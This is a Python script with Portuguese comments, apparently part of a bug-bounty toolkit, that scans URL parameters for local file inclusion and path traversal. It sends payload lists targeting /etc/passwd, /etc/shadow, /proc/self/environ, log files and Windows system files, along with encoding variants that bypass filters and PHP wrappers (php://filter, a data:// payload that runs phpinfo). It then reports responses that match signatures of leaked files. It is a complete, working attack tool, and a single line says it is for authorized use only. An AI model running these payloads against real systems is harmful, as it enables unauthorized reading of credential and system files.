#!/usr/bin/env python3
"""
path_traversal.py — Testa Path Traversal / LFI nos parâmetros classificados

Lê os parâmetros de classificacao/lfi___rfi.txt (ou aceita URL direta)
e testa payloads de LFI/Path Traversal, reportando hits.

Uso:
  python3 path_traversal.py pasta_recon/
  python3 path_traversal.py --url "https://alvo.com/download?file=foto.jpg"
  python3 path_traversal.py --url "https://alvo.com/page?path=home"

ATENÇÃO: só em alvos autorizados.
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[✘] requests não instalado. pip install requests")
    sys.exit(1)

# ── payloads de LFI / Path Traversal ─────────────────────────
PAYLOADS_LINUX = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "....//....//....//etc/passwd",          # bypass de filtro simples
    "..%2F..%2F..%2Fetc%2Fpasswd",          # URL encoding
    "..%252F..%252F..%252Fetc%252Fpasswd",  # double encoding
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\etc\\passwd",              # Windows slash
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # phpinfo()
]

PAYLOADS_WINDOWS = [
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\windows\\win.ini",
    "C:\\boot.ini",
]

PAYLOADS_TODOS = PAYLOADS_LINUX + PAYLOADS_WINDOWS

# ── assinaturas de sucesso ─────────────────────────────────────
ASSINATURAS = [
    "root:x:0:0",           # /etc/passwd
    "root:!:0:0",
    "[extensions]",         # windows/win.ini
    "[boot loader]",
    "# localhost",          # /etc/hosts
    "Linux version",        # /proc/version
    "<?php",               # PHP source
    "HTTP_USER_AGENT",      # /proc/self/environ
]

# ── argumentos ────────────────────────────────────────────────
parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("pasta",  nargs="?", help="Pasta de saída do recon (usa lfi___rfi.txt)")
group.add_argument("--url",  help="URL específica com parâmetro a testar")
parser.add_argument("--timeout", type=int, default=10)
parser.add_argument("--delay",   type=float, default=0.3, help="Delay entre requests (seg)")
parser.add_argument("--output",  default=".", help="Pasta para salvar resultados")
args = parser.parse_args()

OUTPUT_DIR = Path(args.output)
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
RESULTADO_FILE = OUTPUT_DIR / "path_traversal_findings.txt"

SESSION = requests.Session()
SESSION.verify = False
SESSION.headers["User-Agent"] = "Mozilla/5.0 (compatible; BugBountyScanner)"

HITS:  list[dict] = []
TOTAL: int = 0

def detectar_lfi(conteudo: str) -> list[str]:
    return [sig for sig in ASSINATURAS if sig.lower() in conteudo.lower()]

def testar_url(url_base: str, param: str, payload: str) -> dict | None:
    global TOTAL
    TOTAL += 1

    parsed = urlparse(url_base)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]

    nova_query = "&".join(f"{k}={v[0]}" for k, v in params.items())
    nova_url   = urlunparse(parsed._replace(query=nova_query))

    try:
        resp = SESSION.get(nova_url, timeout=args.timeout, allow_redirects=True)
        sigs = detectar_lfi(resp.text)
        if sigs:
            return {
                "url":       nova_url,
                "param":     param,
                "payload":   payload,
                "status":    resp.status_code,
                "tamanho":   len(resp.text),
                "assinaturas": sigs,
                "trecho":    resp.text[:300],
            }
    except Exception:
        pass
    return None

def processar_url_com_parametros(url: str) -> None:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        print(f"  [!] Sem parâmetros em: {url}")
        return

    for param in params:
        print(f"  [→] Testando parâmetro: {param}")
        for payload in PAYLOADS_TODOS:
            time.sleep(args.delay)
            hit = testar_url(url, param, payload)
            if hit:
                HITS.append(hit)
                print(f"  [✔] HIT! {param}={payload[:40]}...")
                print(f"      Assinaturas: {hit['assinaturas']}")

# ── modo: URL direta ──────────────────────────────────────────
if args.url:
    print(f"\n[→] Testando URL: {args.url}")
    processar_url_com_parametros(args.url)

# ── modo: pasta de recon ──────────────────────────────────────
else:
    pasta = Path(args.pasta)
    lfi_file = pasta / "classificacao" / "lfi___rfi.txt"

    if not lfi_file.exists():
        print(f"[✘] Arquivo não encontrado: {lfi_file}")
        print("    Rode recon-full.sh primeiro ou use --url")
        sys.exit(1)

    # extrair URLs do arquivo de classificação
    urls_com_params: list[str] = []
    linhas = lfi_file.read_text(errors="ignore").splitlines()
    for linha in linhas:
        if linha.startswith("URL   : "):
            urls_com_params.append(linha.replace("URL   : ", "").strip())

    if not urls_com_params:
        print("[!] Nenhuma URL com parâmetros LFI encontrada.")
        sys.exit(0)

    print(f"\n[→] {len(urls_com_params)} URLs com parâmetros LFI para testar")
    for url in urls_com_params[:50]:  # limita a 50 para não ser muito agressivo
        print(f"\n[→] {url}")
        processar_url_com_parametros(url)

# ── relatório ─────────────────────────────────────────────────
with open(RESULTADO_FILE, "w") as f:
    f.write(f"# Path Traversal / LFI — Resultados\n")
    f.write(f"# Requests: {TOTAL}  |  Hits: {len(HITS)}\n\n")
    if HITS:
        for h in HITS:
            f.write(f"{'='*60}\n")
            f.write(f"URL     : {h['url']}\n")
            f.write(f"Param   : {h['param']}\n")
            f.write(f"Payload : {h['payload']}\n")
            f.write(f"Status  : {h['status']}\n")
            f.write(f"Sigs    : {', '.join(h['assinaturas'])}\n")
            f.write(f"Trecho  :\n{h['trecho']}\n\n")
    else:
        f.write("Nenhum hit encontrado.\n")

print(f"\n{'='*55}")
print(f"  Total testado : {TOTAL}")
print(f"  Hits          : {len(HITS)}")
print(f"  Relatório     : {RESULTADO_FILE}")
print(f"{'='*55}")

if not HITS:
    print("  Nenhum path traversal detectado com os payloads testados.")
    print("  Teste manual com Burp para variações mais complexas.")
